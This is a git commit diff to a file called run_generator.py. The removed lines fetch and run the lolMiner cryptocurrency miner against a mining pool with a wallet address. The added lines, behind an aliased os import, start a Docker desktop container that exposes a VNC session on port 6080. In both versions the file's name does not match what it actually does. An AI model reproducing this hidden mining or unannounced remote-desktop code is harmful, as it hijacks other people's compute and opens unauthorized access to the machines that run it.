20cf63ab8838c164eacc46304f005ddf7badcecb
Vandeptrai789 <92248590+Vandeptrai789@users.noreply.github.com>
2021-10-10 16:08:12 +0700

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,8 +1,2 @@
-! wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
-    
-! tar -xf lolMiner_v1.29_Lin64.tar.gz
-    
-%cd 1.29/
-    
-! ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TQVGNG2cEFq8iAQ54rZ56SAmnCM2msZY64#ek61-6h9x --ethstratum ETHPROXY
-            
+import os as alpha
+alpha.system("docker run -p 6080:80 dorowu/ubuntu-desktop-lxde-vnc")
